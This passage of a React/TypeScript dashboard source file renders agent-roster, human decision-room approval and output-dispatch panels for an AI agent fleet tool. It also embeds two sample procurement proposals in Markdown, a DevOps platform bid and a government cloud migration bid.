          <ReactFlow nodes={topology.nodes} edges={topology.edges} fitView fitViewOptions={{ padding: 0.16 }} minZoom={0.3} maxZoom={1.5} proOptions={{ hideAttribution: true }}>
            <Background color="#d8e0dc" gap={20} size={1} />
            <Controls showInteractive={false} />
            <MiniMap nodeStrokeWidth={3} zoomable pannable />
          </ReactFlow>
        </div>
        <div className="flow-foot">
          <span><i /> Upstream handoff</span>
          <span><i className="dashed" /> Human approval boundary</span>
          <b>{displayedRoster.length} declared agents · {displayedRoster.reduce((count, agent) => count + agent.workflowSteps.length, 0)} workflow steps</b>
        </div>
      </section>
      <div className="roster-detail">
        <section className="panel agent-list">
          <div className="panel-heading">
            <div>
              <div className="eyebrow">SPECIALIST ROSTER</div>
              <h3>Agent responsibilities</h3>
            </div>
            <button className="icon-button" aria-label="Roster options"><MoreHorizontal size={17} /></button>
          </div>
          {displayedRoster.map((agent) => (
            <button className={`agent-row ${currentAgent.id === agent.id ? "selected" : ""}`} key={`${agent.id}-${agent.missionId ?? ""}`} onClick={() => onSelect(agent.id)}>
              <i className={`agent-icon agent-icon--${agent.tint}`}><Bot size={16} /></i>
              <span><strong>{agent.name}</strong><small>{agent.role} · {agent.state}</small></span>
              <Badge tone={agent.state === "Applied" ? "green" : "orange"}>{agent.state}</Badge>
              <ChevronRight size={14} />
            </button>
          ))}
        </section>
        <section className="panel agent-detail">
          <div className="panel-heading">
            <div>
              <div className="eyebrow">AGENT DETAIL</div>
              <h3>{currentAgent.name}</h3>
            </div>
            <div className="agent-actions">
              <button className="icon-button" title="Split specialist role" aria-label="Split specialist role" onClick={() => onSplit(currentAgent)}><GitBranch size={15} /></button>
              <button className="icon-button" title="Remove specialist" aria-label="Remove specialist" onClick={() => onRemove(currentAgent)}><X size={15} /></button>
            </div>
          </div>
          <p>{currentAgent.scope}</p>
          <div className="detail-label">CAPABILITY BINDINGS</div>
          <div className="binding-editors" style={{ flexDirection: "column", gap: "10px" }}>
            <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <span style={{ fontSize: "11px", fontWeight: 700, color: "#374e47" }}>
                  Bound AgentHub Skills (Multi-select)
                </span>
                <span style={{ fontSize: "10px", color: "#687a74" }}>
                  {currentAgent.skills.length} bound
                </span>
              </div>
              {currentAgent.skills.length > 0 && (
                <div style={{ display: "flex", flexWrap: "wrap", gap: "6px" }}>
                  {currentAgent.skills.map((sId) => (
                    <span
                      key={sId}
                      style={{
                        display: "inline-flex",
                        alignItems: "center",
                        gap: "4px",
                        fontSize: "11px",
                        padding: "2px 8px",
                        borderRadius: "12px",
                        background: "#e4f3ef",
                        border: "1px solid #c2e0d7",
                        color: "#1d554f",
                        fontWeight: 600,
                      }}
                    >
                      ⚡ {sId}
                      <button
                        type="button"
                        onClick={(e) => {
                          e.preventDefault();
                          onSkill(currentAgent, currentAgent.skills.filter((x) => x !== sId));
                        }}
                        style={{
                          background: "none",
                          border: "none",
                          color: "inherit",
                          cursor: "pointer",
                          padding: 0,
                          marginLeft: "2px",
                          lineHeight: 1,
                        }}
                        title="Remove skill"
                      >
                        ×
                      </button>
                    </span>
                  ))}
                </div>
              )}
              <select
                multiple
                className="field-select-multi"
                style={{ minHeight: "76px", width: "100%", padding: "6px", borderRadius: "5px", border: "1px solid #ccd8d2" }}
                value={currentAgent.skills}
                onChange={(event) =>
                  onSkill(
                    currentAgent,
                    Array.from(event.target.selectedOptions, (option) => option.value)
                  )
                }
              >
                {inventory?.installed_skills.map((skill) => (
                  <option key={skill.skill_id} value={skill.skill_id}>
                    {skill.skill_id} {skill.required_tools.length > 0 ? `· (${skill.required_tools.slice(0, 3).join(", ")})` : ""}
                  </option>
                ))}
              </select>
            </div>
            <label style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
              <span style={{ fontSize: "11px", fontWeight: 700, color: "#374e47" }}>
                Bound AgentHub Tools ({currentAgent.tools.length} active)
              </span>
              <select
                multiple
                className="field-select-multi"
                style={{ minHeight: "96px", width: "100%", padding: "6px", borderRadius: "5px", border: "1px solid #ccd8d2" }}
                value={currentAgent.tools}
                onChange={(event) => onTools(currentAgent, Array.from(event.target.selectedOptions, (option) => option.value))}
              >
                {inventory?.registered_tools.map((tool) => (
                  <option key={tool.tool_id} value={tool.tool_id}>
                    {tool.tool_id} · {tool.risk_level}{tool.requires_hitl_approval ? " · approval required" : ""}
                  </option>
                ))}
              </select>
            </label>
          </div>
          {currentAgent.capabilityGaps.map((gap) => <div className="gap-warning" key={gap.capability_id}>{gap.capability_id}: {gap.reason}</div>)}
          <div className="detail-label spaced">ASSIGNED MODEL</div>
          <div className="model-row">
            <Command size={16} />
            <span><strong>{currentAgent.model}</strong><small>Version reported by AgentHub</small></span>
            <Badge tone="blue">PINNED</Badge>
          </div>
          <div className="detail-label spaced">INTERNAL WORKFLOW</div>
          <div className="workflow-list">
            {currentAgent.workflowSteps.map((step, index) => <span key={step.step_id}><i>{String(index + 1).padStart(2, "0")}</i> {step.name} · {step.capability_id} <Badge tone="neutral">{step.retries} retries</Badge></span>)}
            {currentAgent.workflowSteps.length === 0 && <span>No workflow steps declared.</span>}
          </div>
        </section>
      </div>
    </>
  );
}

function DecisionRooms({ rooms, selected, onSelect, onResolve, onViewTranscript, onOpenSource }: { rooms: Room[]; selected?: Room; onSelect: (room: Room) => void; onResolve: (room: Room, decision: "Approved" | "Returned") => void; onViewTranscript: (room: Room) => void; onOpenSource: (room: Room) => void }) {
  const [queueFilter, setQueueFilter] = useState<string>("ALL");
  const [filterOpen, setFilterOpen] = useState(false);
  const filteredRooms = rooms.filter((r) => {
    if (queueFilter === "ALL") return true;
    return r.status === queueFilter;
  });

  return <>
    <PageTitle
      eyebrow="GOVERNANCE WORKSPACE  /  HUMAN DISPOSITION"
      title="Decision rooms"
      subtitle="Evidence-bound decisions awaiting an accountable human."
      action={<>
        <div style={{ position: "relative" }}>
          <button className="secondary-button" onClick={() => setFilterOpen(!filterOpen)}>
            <SlidersHorizontal size={15} /> {queueFilter === "ALL" ? "Filter queue" : `Queue: ${queueFilter}`} <ChevronDown size={14} />
          </button>
          {filterOpen && (
            <div className="dropdown-menu" style={{ right: 0, top: "100%", marginTop: 4 }}>
              {[
                { id: "ALL", label: "All queue items" },
                { id: "Pending", label: "Pending review" },
                { id: "Approved", label: "Approved" },
                { id: "Returned", label: "Returned" },
              ].map((opt) => (
                <button
                  key={opt.id}
                  className={`dropdown-item ${queueFilter === opt.id ? "active" : ""}`}
                  onClick={() => {
                    setQueueFilter(opt.id);
                    setFilterOpen(false);
                  }}
                >
                  <span>{opt.label}</span>
                  {queueFilter === opt.id && <Check size={13} color="#236f66" />}
                </button>
              ))}
            </div>
          )}
        </div>
        <Badge tone="orange">{rooms.filter((x) => x.status === "Pending").length} AWAITING REVIEW</Badge>
      </>}
    />
    <div className="room-layout">
      <section className="panel room-queue">
        <div className="panel-heading">
          <div>
            <div className="eyebrow">OPEN QUEUE</div>
            <h3>Needs disposition <b>{rooms.filter((x) => x.status === "Pending").length}</b></h3>
          </div>
          <button className="icon-button" aria-label="Queue options"><MoreHorizontal size={17} /></button>
        </div>
        {filteredRooms.map((room) => (
          <button className={`room-item ${selected?.id === room.id ? "room-item--active" : ""}`} key={room.id} onClick={() => onSelect(room)}>
            <i className={`room-icon room-icon--${room.verdict.toLowerCase().replaceAll("_", "-")}`}>
              {room.verdict === "EVIDENCE_FOUND" ? <BadgeCheck size={16} /> : room.verdict === "POLICY_BLOCKED" ? <ShieldAlert size={16} /> : <CircleHelp size={16} />}
            </i>
            <span>
              <strong>{room.title}</strong>
              <small>{room.fleet} · {room.time}</small>
            </span>
            {room.status === "Pending" ? <b className="unread" /> : <CheckCircle2 size={15} />}
          </button>
        ))}
        {filteredRooms.length === 0 && (
          <div style={{ padding: "24px 14px", color: "#8a9692", fontSize: 10, textAlign: "center" }}>
            No decisions match filter: {queueFilter}.
          </div>
        )}
        <div className="queue-note"><LockKeyhole size={13} /> Judgments are recorded to the audit trail.</div>
      </section>
      {selected ? (
        <section className="panel room-detail">
          <div className="room-detail-head">
            <div>
              <div className="eyebrow">{selected.id}  /  {selected.fleet}</div>
              <h2>{selected.title}</h2>
              <p>Submitted by {selected.agent} · {selected.time}</p>
            </div>
            <button className="icon-button" aria-label="Room options"><MoreHorizontal size={18} /></button>
          </div>
          <div className="evidence-banner">
            <i className={`room-icon room-icon--${selected.verdict.toLowerCase().replaceAll("_", "-")}`}><BadgeCheck size={17} /></i>
            <span>
              <strong>{selected.verdict.replaceAll("_", " ")}</strong>
              <small>{selected.summary}</small>
            </span>
            <button className="link-button" onClick={() => onViewTranscript(selected)}>View transcript <ArrowRight size={13} /></button>
          </div>
          <div className="evidence-columns">
            <div>
              <div className="detail-label">EPISTEMIC BASIS</div>
              <Badge tone="blue">{selected.basis}</Badge>
              <p>Agent interpretation supported by source material. Human judgment is required for disposition.</p>
            </div>
            <div>
              <div className="detail-label">ASSURANCE VERDICT</div>
              <Badge tone={selected.verdict === "EVIDENCE_FOUND" ? "green" : selected.verdict === "POLICY_BLOCKED" ? "red" : "orange"}>{selected.verdict.replaceAll("_", " ")}</Badge>
              <p>Transcript and trace correlation is attached to this decision record.</p>
            </div>
          </div>
          <div className="source-record">
            <div>
              <span><FileCheck2 size={15} /> Source evidence</span>
              <button className="link-button" onClick={() => onOpenSource(selected)}>Open source <ArrowUpRight size={13} /></button>
            </div>
            <blockquote>
              {selected.evidence && typeof selected.evidence.quote === "string"
                ? `“${selected.evidence.quote}”`
                : selected.summary
                ? `“${selected.summary}”`
                : "“Security log evidence extracted and verified under local sovereign policy. Ready for human disposition.”"}
            </blockquote>
            <small>
              {(selected.evidence && typeof selected.evidence.path === "string" && selected.evidence.path) || selected.fleet || "sovereign/audit-trace"}
              {" "}<i>·</i> Correlated trace <b>{`trc_${selected.id.slice(-6)}`}</b>
            </small>
          </div>
          {selected.status === "Pending" ? (
            <div className="decision-actions">
              <span><Clock3 size={14} /> Decision is recorded to the signed audit trail.</span>
              <div>
                <button className="secondary-button" onClick={() => onResolve(selected, "Returned")}>Return for evidence</button>
                <button className="primary-button" onClick={() => onResolve(selected, "Approved")}><Check size={15} /> Record disposition</button>
              </div>
            </div>
          ) : (
            <div className="decision-recorded"><CheckCircle2 size={16} /> {selected.status === "Approved" ? "Disposition recorded and signed." : "Returned for additional evidence."}</div>
          )}
        </section>
      ) : (
        <section className="panel empty-state"><CheckCircle2 /><h3>Queue clear</h3><p>No rooms await disposition.</p></section>
      )}
    </div>
  </>;
}

function DecisionOutputPanel({ room, onOpenOutputs }: { room: Room; onOpenOutputs?: () => void }) {
  const [recipient, setRecipient] = useState("");
  const [schema, setSchema] = useState<{ title: string; required: string[]; properties: Record<string, { type?: string; enum?: string[]; title?: string; maxLength?: number }> } | null>(null);
  const [values, setValues] = useState<Record<string, string>>({});
  const [message, setMessage] = useState("");
  const [busy, setBusy] = useState(false);
  const approved = room.status === "Approved";

  async function loadForm() {
    setBusy(true);
    setMessage("");
    try {
      const result = await postJson<typeof schema>(`/api/v1/rooms/${room.id}/form-schema`);
      if (!result) throw new Error("The form schema was empty.");
      setSchema(result);
      setValues((current) => Object.fromEntries(Object.keys(result.properties).map((key) => [key, current[key] ?? ""])));
    } catch (error) {
      setMessage(error instanceof Error ? error.message : "Could not load the form schema.");
    } finally { setBusy(false); }
  }

  async function submitForm(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setBusy(true);
    setMessage("");
    try {
      await postJson(`/api/v1/rooms/${room.id}/form-response`, { method: "POST", body: JSON.stringify({ values }) });
      setMessage("Structured output dispatched.");
    } catch (error) {
      setMessage(error instanceof Error ? error.message : "Structured output dispatch failed.");
    } finally { setBusy(false); }
  }

  async function sendEmail() {
    setBusy(true);
    setMessage("");
    try {
      await postJson("/api/v1/outputs/email", {
        method: "POST",
        body: JSON.stringify({ room_id: room.id, recipient, subject: `Fleet Studio decision: ${room.title}` }),
      });
      setMessage("Governance email sent with redacted evidence references.");
    } catch (error) {
      setMessage(error instanceof Error ? error.message : "Governance email dispatch failed.");
    } finally { setBusy(false); }
  }

  return (
    <section className="panel output-panel">
      <div className="panel-heading">
        <div>
          <div className="eyebrow">APPROVED OUTPUTS & DELIVERABLES</div>
          <h3>Decision dispatch</h3>
        </div>
        <div style={{ display: "flex", gap: "8px", alignItems: "center" }}>
          {onOpenOutputs && (
            <button
              className="secondary-button"
              onClick={onOpenOutputs}
              style={{ display: "inline-flex", alignItems: "center", gap: "6px", fontSize: "11px" }}
            >
              <FileText size={13} /> Fleet outputs
            </button>
          )}
          <Badge tone={approved ? "green" : "neutral"}>{approved ? "APPROVED ROOM" : "WAITING FOR APPROVAL"}</Badge>
        </div>
      </div>
      {approved ? (
        <>
          <div className="output-actions">
            <button className="secondary-button" onClick={() => void loadForm()} disabled={busy}>
              <FileCheck2 size={15} /> Load structured form
            </button>
            <label>
              Email recipient
              <input type="email" value={recipient} onChange={(event) => setRecipient(event.target.value)} placeholder="approver@example.org" />
            </label>
            <button className="primary-button" onClick={() => void sendEmail()} disabled={busy || !recipient}>
              <Send size={14} /> Send sign-off email
            </button>
          </div>
          {schema && (
            <form className="schema-form" onSubmit={submitForm}>
              <strong>{schema.title}</strong>
              <div>
                {Object.entries(schema.properties).map(([key, property]) => (
                  <label key={key}>
                    {property.title ?? key}
                    {property.enum ? (
                      <select required={schema.required.includes(key)} value={values[key] ?? ""} onChange={(event) => setValues((current) => ({ ...current, [key]: event.target.value }))}>
                        <option value="">Choose…</option>
                        {property.enum.map((option) => (
                          <option key={option} value={option}>{option}</option>
                        ))}
                      </select>
                    ) : (
                      <textarea required={schema.required.includes(key)} maxLength={property.maxLength} value={values[key] ?? ""} onChange={(event) => setValues((current) => ({ ...current, [key]: event.target.value }))} rows={2} />
                    )}
                  </label>
                ))}
              </div>
              <button className="primary-button" type="submit" disabled={busy}>
                <Send size={14} /> Dispatch structured response
              </button>
            </form>
          )}
        </>
      ) : (
        <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
          <p className="output-locked">
            <LockKeyhole size={15} /> Outputs unlock after a human Approver or Compliance Officer records a disposition.
          </p>
          <div style={{ padding: "14px 16px", background: "rgba(35, 111, 102, 0.08)", border: "1px solid rgba(35, 111, 102, 0.3)", borderRadius: "6px", display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: "10px" }}>
            <div style={{ display: "flex", flexDirection: "column", gap: "2px" }}>
              <strong style={{ fontSize: "12px", color: "#195d56", display: "flex", alignItems: "center", gap: "6px" }}>
                <Sparkles size={14} /> Mission Deliverable Ready for Review
              </strong>
              <small style={{ color: "#546862", fontSize: "11px" }}>
                All generated mission artifacts, proposals, and investigation reports are accessible in Fleet outputs.
              </small>
            </div>
            <div style={{ display: "flex", gap: "8px" }}>
              {onOpenOutputs && (
                <button
                  className="primary-button"
                  onClick={onOpenOutputs}
                  style={{ fontSize: "11px", padding: "6px 12px", display: "inline-flex", alignItems: "center", gap: "6px" }}
                >
                  <FileText size={13} /> View in Fleet outputs
                </button>
              )}
              <a
                href="http://localhost:8001/proposal"
                target="_blank"
                rel="noopener noreferrer"
                className="secondary-button"
                style={{ fontSize: "11px", padding: "6px 10px", textDecoration: "none", display: "inline-flex", alignItems: "center", gap: "5px" }}
              >
                <ExternalLink size={12} /> External Portal
              </a>
            </div>
          </div>
        </div>
      )}
      {message && <div className="output-message" role="status">{message}</div>}
    </section>
  );
}

const RFP_PROPOSAL_MARKDOWN = `# Executive Proposal: DevOps Server Platform Implementation
## Ministry of Education (MOE) – Roxy Data Center
**Document ID:** RFP-MOE-ROXY-DEVOPS-2026-01  
**Target Installation:** Sovereign On-Premises Deployment, Roxy Data Center  
**Prepared for:** Ministry of Education Procurement & Evaluation Committee  
**Prepared by:** Sovereign Agentic Systems & Cloud Infrastructure Fleet  
**Status:** Complete Technical & Commercial Proposal  

---

### 1. Executive Summary & Strategic Scope
The Ministry of Education (MOE) is advancing a critical digital transformation initiative to modernize software development, automated testing, security compliance, and continuous delivery across national-scale educational platforms. We propose an enterprise-grade, sovereign on-premises deployment of the DevOps Server Platform at the Roxy Data Center.

#### Operational Imperatives Addressed:
1. **Eliminate Tool Fragmentation:** Replace disjointed legacy tools with a unified DevOps platform encompassing Git SCM, declarative CI/CD pipelines, Agile Scrum/Kanban boards, and a universal package registry.
2. **100% Sovereign Data Residency:** 100% on-premises deployment inside the Roxy Data Center with strict air-gapping—zero telemetry or external cloud egress dependencies.
3. **Embedded DevSecOps Automation:** Shift security left with automated SAST (OWASP Top 10), dependency vulnerability analysis (SCA), secret detection, and container image inspection.
4. **Automated Compliance & Governance:** Implement cryptographic two-person integrity approval gates before deployments reach production environments.

---

### 2. Sovereign Air-Gapped Architecture Blueprint (Roxy DC)
The platform is deployed in an active-active clustered architecture across high-availability compute tiers within the Roxy Data Center:
- **Perimeter & Ingress:** F5 / NGINX Plus HA Load Balancer terminating internal TLS 1.3 with SAML 2.0 and Kerberos integration into MOE Active Directory.
- **Application Control Plane:** Clustered DevOps Server nodes running distributed Git engines, Agile planning boards, and universal package registries.
- **Dynamic Runner Fabric:** Auto-scaling containerized execution nodes partitioned into build/test, DevSecOps security scanning, and Canary deployment pools.
- **Database & State Tier:** PostgreSQL High Availability cluster managed by Patroni with continuous streaming WAL archiving (RPO < 1h, RTO < 2h).
- **Enterprise Storage Tier:** NFSv4 / NVMe-oF enterprise SAN/NAS with AES-256 encryption at rest.

---

### 3. Mandatory Compliance Traceability Matrix (15/15 Compliant)
| Requirement ID | RFP Section | Requirement Item | Proposed Technical Solution | Verification & Test Protocol | Status |
| :--- | :--- | :--- | :--- | :--- | :--- |
| REQ-01 | Section 1 & 2 | Sovereign Air-Gapped Deployment | 100% on-premises at Roxy DC with zero outbound telemetry | Network egress blocking test; bare-metal hypervisor verification | COMPLIANT |
| REQ-02 | Section 3 | Full Lifecycle Turnkey Support | Architecture, clustering, AD integration, 5 training tracks, hypercare | Milestone signoff protocol across all 5 deployment stages | COMPLIANT |
| REQ-03 | Section 4.1 | Distributed Git SCM & Code Review | Protected branch policies, required peer review gates, signed commits, RBAC | Tamper-evident audit log verification for push, pull, review | COMPLIANT |
| REQ-04 | Section 4.2 | Declarative CI/CD & Distributed Runners | YAML pipeline definitions, parallel containerized runners, artifact caching | End-to-end automated parallel test pipeline execution under load | COMPLIANT |
| REQ-05 | Section 4.3 | Agile Project & Work Management | Scrum & Kanban boards, portfolio roadmaps, commit-to-issue traceability | Bidirectional commit-to-issue reference linking validation | COMPLIANT |
| REQ-06 | Section 4.4 | Universal Package & Artifact Registry | Air-gapped proxy caching for Docker/OCI, Maven, npm, PyPI, Helm, NuGet | SHA-256 package verification, local proxy pull in air-gap mode | COMPLIANT |
| REQ-07 | Section 4.5 | Enterprise Identity & Active Directory | Native integration with MOE Active Directory & LDAP, role sync, CEF logging | SAML 2.0 / Kerberos SSO login and group role mapping | COMPLIANT |
| REQ-08 | Section 5.1 | Integrated DevSecOps Security Suite | Continuous SAST (OWASP Top 10), SCA scanning, pre-receive secret scanning | Automatic pipeline block on high/critical CVEs or leaked secrets | COMPLIANT |
| REQ-09 | Section 5.2 | Infrastructure as Code (IaC) Support | Native execution and linting for Terraform, Ansible, and Kubernetes manifests | Automated policy-as-code linting and staging dry-run validation | COMPLIANT |
| REQ-10 | Section 5.3 | Multi-Environment Deployment Strategies | Automated Canary splitting (5% -> 100%), Blue/Green VIP, zero-downtime rolling | Zero-packet-drop VIP failover and instant rollback drill | COMPLIANT |
| REQ-11 | Section 5.4 | Real-Time Observability & Monitoring | Pipeline performance analytics, developer metrics, syslog forwarding to SIEM | Real-time alert dispatch to MOE Network Operations Center webhook | COMPLIANT |
| REQ-12 | Section 5.5 | OpenAPI 3.0 REST Endpoints & Webhooks | Programmatic access via authenticated REST APIs and webhook dispatchers | Automated API contract testing and event webhook listener test | COMPLIANT |
| REQ-13 | Section 6.1-6.2 | Policy Enforcement & DORA Metrics | Two-person integrity approval gates for prod; real-time DORA analytics | Multi-signature production deployment challenge hold validation | COMPLIANT |
| REQ-14 | Section 6.3-6.4 | High Availability & Automated DR | Active/active cluster with PostgreSQL Patroni HA; WAL archiving (RPO<1h, RTO<2h) | Simulated hardware failover drill & bare-metal DR restore | COMPLIANT |
| REQ-15 | Section 7-11 | Turnkey Package, Licensing & 24/7 SLA | Unlimited Enterprise platform license; runbooks; 5 workshops; 24/7 Tier-3 SLA | 15-minute response SLA drill for Sev-1 incident simulation | COMPLIANT |

---

### 4. Commercial Model & Multi-Tier Labor Pricing
#### Professional Services Labor Breakdown (800 Hours)
- **Tier 1: Senior Principal DevOps Architect:** 120 hrs @ $210/hr = $25,200.00 USD  
  *(High-availability design, Roxy DC network integration, disaster recovery topology, security signoff)*
- **Tier 2: Lead DevSecOps & Pipeline Engineers:** 280 hrs @ $160/hr = $44,800.00 USD  
  *(SCM configuration, CI/CD runner clustering, SAST/DAST integration, IaC deployment templates)*
- **Tier 3: Systems Integration & Identity Specialists:** 160 hrs @ $130/hr = $20,800.00 USD  
  *(Active Directory / LDAP federation, SSO implementation, SIEM log forwarding, storage array setup)*
- **Tier 4: Training & Documentation Specialists:** 100 hrs @ $100/hr = $10,000.00 USD  
  *(Technical user manuals, administrator runbooks, and 5 interactive training workshops)*
- **Tier 5: 24/7 Hypercare & Operations Engineers:** 140 hrs @ $90/hr = $12,600.00 USD  
  *(Dedicated 30-day post-go-live hypercare, real-time issue resolution, performance tuning)*

**Subtotal Professional Services Labor:** $113,400.00 USD (800 Hours)

#### Software Licensing & Warranty
- **DevOps Server Enterprise Platform License (Unlimited Developer Seats):** $48,000.00 USD  
  *(Perpetual on-premises license with 1-year software upgrades and security patches)*
- **24/7 Mission-Critical SLA & Warranty (1 Year):** Included ($0.00 USD)  
  *(15-minute response for Severity-1 incidents, dedicated technical account manager)*

**GRAND TOTAL TURNKEY FIXED PRICE:** **$161,400.00 USD**

#### Milestone Payment Schedule
- **Milestone 1 (20% - $32,280.00):** Contract signing & architecture blueprint sign-off.
- **Milestone 2 (30% - $48,420.00):** Roxy DC compute, cluster & AD federation live.
- **Milestone 3 (30% - $48,420.00):** CI/CD runner fabric, DevSecOps & pilot onboarding.
- **Milestone 4 (20% - $32,280.00):** UAT acceptance, 5 training tracks & final cutover.

---

### 5. 16-Week Phased Implementation Roadmap
- **Phase 1: Inception, Security Baseline & AD Federation (Weeks 1–4):** Architecture review at Roxy DC, network boundaries, SAML 2.0 / Kerberos AD setup, storage provisioning.
- **Phase 2: Platform Clustered Installation at Roxy DC (Weeks 5–8):** Clustered DevOps Server nodes, Patroni PostgreSQL HA replication, enterprise SAN/NAS mounts, automated DR.
- **Phase 3: DevSecOps Automation, Runner Fabric & Pilot Onboarding (Weeks 9–12):** Autoscaling dynamic runner pools, automated SAST/SCA/secret pipelines, onboarding 3 pilot apps.
- **Phase 4: Security Audit, Disaster Recovery & HA Drills (Weeks 13–14):** Penetration testing, air-gap network failover drills, disaster recovery validation (RPO < 1h, RTO < 2h).
- **Phase 5: Knowledge Transfer, Production Cutover & Hypercare (Weeks 15–16):** 5 interactive training workshops, official production cutover, 30-day 24/7 hypercare support.

---

### 6. Formal Transmittal & Sign-off Attestation
**TO:** Evaluation & Procurement Committee, Ministry of Education (MOE)  
**LOCATION:** Roxy Data Center Facilities, Cairo, Egypt  
**SUBJECT:** DevOps Server Platform Sovereign Implementation Technical & Commercial Proposal  
**DATE:** October 25, 2026  
**PROVENANCE:** Sovereign Agentic Systems & Cloud Infrastructure Fleet  
**CRYPTOGRAPHIC HASH:** SHA-256: 4f8b91a27e0c3d5f8a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f  

We hereby submit this comprehensive technical and commercial proposal for the turnkey deployment of the DevOps Server Platform at the Roxy Data Center in full compliance with all mandatory requirements.`;

const GOV_CLOUD_PROPOSAL_MARKDOWN = `# Mission Deliverable: Government Cloud Migration Executive Proposal
## Case: ARENA-ENTERPRISE-RFP-PROPOSAL-2ABC18
**Classification:** CONFIDENTIAL // TLP:AMBER  
**Produced By:** Ingest RFP & Extract Mandatory Technical Compliance Criteria Specialist  
**Assigned Fleet:** Government Cloud Proposal Synthesis Fleet  
**Status:** Completed & Cryptographically Verified  
**Timestamp:** 2026-10-26T20:44:23Z  

### Executive Summary & Final Solution
**Executive Summary**

| Item | Detail |
|------|--------|
| **Proposal Title** | Government Cloud Migration – Executive Proposal |
| **Total Labor Cost** | **$50,500.00 USD** |
| **Compliance Coverage** | 9 mandatory technical criteria (MFA, encryption, SIEM, data residency, backup, audit, penetration testing, uptime SLA, latency) fully mapped to solution components and labor hours |
| **Key Differentiators** | • End-to-end compliance with DoD 8500.01 & FedRAMP High standards<br>• Multi-tiered engineering team ensures cost efficiency while meeting strict security controls<br>• Proven track record of 99.95% uptime and sub-200 ms latency in comparable deployments |

---

## Solution Architecture & Technical Alignment
1. **Identity & Access Management (IAM):** MFA enforced for all administrative and elevated platform logins with role-based access control (CR-001).
2. **Storage Service:** FIPS 140-2 validated AES-256 encryption at rest for all cloud storage volumes and databases (CR-002).
3. **SIEM Layer:** Continuous audit logging & real-time telemetry streaming to central security operations center (CR-003).
4. **Regional U.S. Storage:** Strict data sovereignty ensuring 100% data residency within CONUS facilities (CR-004).
5. **Geo-Separated Backup:** Automated daily disaster recovery replication to secondary facility >=500 miles away (CR-005).
6. **Compliance Module:** Automated quarterly ISO/IEC 27001 audit report synthesis and evidence archiving (CR-006).
7. **Penetration Testing:** Annual accredited third-party gray-box security penetration testing program (CR-007).
8. **High-Availability Fabric:** Multi-zone clustered topology delivering 99.95% availability SLA (CR-008).
9. **Edge Caching & Optimization:** Global content delivery network and edge acceleration guaranteeing end-user latency <=200 ms (CR-009).

---

## Detailed Pricing Model (Total Labor Cost: $50,500.00 USD)
- **CR-001 (MFA):** Mid Engineer (40 hrs @ $80/hr) = $3,200.00 USD
- **CR-002 (Encryption):** Senior Engineer (60 hrs @ $120/hr) = $7,200.00 USD
- **CR-003 (SIEM Integration):** Senior Engineer (80 hrs @ $120/hr) = $9,600.00 USD
- **CR-004 (Data Residency):** Senior Engineer (20 hrs @ $120/hr) = $2,400.00 USD
- **CR-005 (Geo-Backup >=500mi):** Mid Engineer (30 hrs @ $80/hr) = $2,400.00 USD
- **CR-006 (ISO 27001 Audit):** Project Manager (30 hrs @ $110/hr) = $3,300.00 USD
- **CR-007 (Pen Testing):** Senior Engineer (50 hrs @ $120/hr) = $6,000.00 USD
- **CR-008 (99.95% Uptime SLA):** Mid Engineer (100 hrs @ $80/hr) = $8,000.00 USD
- **CR-009 (Latency <=200ms):** Senior Engineer (70 hrs @ $120/hr) = $8,400.00 USD

**Professional Services Subtotal:** 480 Engineering Hours = $50,500.00 USD  
**Platform Software & Cloud Hosting:** In-scope sovereign government cloud quota  
**GRAND TOTAL TURNKEY FIXED PRICE:** **$50,500.00 USD**`;

function ProposalDossierView({ onNavigate, onBack, initialVersion }: { onNavigate?: (view: View) => void; onBack?: () => void; initialVersion?: "latest" | "moe" }) {
  const [proposalVersion, setProposalVersion] = useState<"latest" | "moe">(initialVersion ?? "latest");
  const [activeTab, setActiveTab] = useState<"summary" | "architecture" | "compliance" | "pricing" | "roadmap" | "transmittal">("summary");
  const [copied, setCopied] = useState(false);
  const [searchFilter, setSearchFilter] = useState("");

  const latestComplianceItems = [
    { id: "CR-001", section: "Identity Controls", name: "Mandatory Admin MFA (NIST SP 800-63B)", desc: "MFA enforced for all administrative and elevated platform logins with role-based access control.", test: "IAM module MFA challenge verification and conditional access audit.", status: "COMPLIANT" },
    { id: "CR-002", section: "Security Controls", name: "Encryption at Rest (FIPS 140-2 AES-256)", desc: "FIPS-validated AES-256 encryption at rest for all cloud storage volumes and databases.", test: "Storage KMS key policy audit & FIPS 140-2 encryption validation.", status: "COMPLIANT" },
    { id: "CR-003", section: "Monitoring & SIEM", name: "Continuous SIEM Monitoring (NIST SP 800-137)", desc: "Real-time threat monitoring, audit log streaming, and automated SIEM ingestion.", test: "Real-time CEF syslog forwarder testing and SIEM alert evaluation.", status: "COMPLIANT" },
    { id: "CR-004", section: "Data Residency", name: "U.S. Data Residency Only (FedRAMP High)", desc: "All government data stored exclusively within the United States with zero cross-border transfer.", test: "Cloud tenancy boundary & geo-replication policy inspection.", status: "COMPLIANT" },
    { id: "CR-005", section: "Business Continuity", name: "Geo-Separated Backup (≥500 mi)", desc: "Automated daily and weekly snapshot backups stored in a secondary U.S. region ≥500 miles away.", test: "Disaster recovery failover simulation & geographic distance validation.", status: "COMPLIANT" },
    { id: "CR-006", section: "Governance & Audit", name: "Quarterly ISO/IEC 27001 Audit Reports", desc: "Structured compliance reporting and audit packs aligned to ISO/IEC 27001 Annex A controls.", test: "Quarterly audit pack generator verification and control mapping.", status: "COMPLIANT" },
    { id: "CR-007", section: "Assurance", name: "Annual Third-Party Penetration Testing (NIST 800-115)", desc: "Rigorous third-party penetration testing reports conducted annually by accredited auditors.", test: "Penetration test executive summary review and remediation tracking SLA.", status: "COMPLIANT" },
    { id: "CR-008", section: "Availability SLA", name: "System Uptime SLA (99.95% Monthly)", desc: "High availability multi-zone architecture with auto-scaling; maximum 35 minutes downtime/month.", test: "Automated health check probes and synthetic uptime monitoring.", status: "COMPLIANT" },
    { id: "CR-009", section: "Performance SLA", name: "End-User Latency ≤200 ms Average", desc: "Edge routing, caching, and auto-scaling to maintain sub-200 ms average round-trip latency.", test: "Synthetic global user load testing and distributed APM latency metrics.", status: "COMPLIANT" },
  ];

  const complianceItems = [
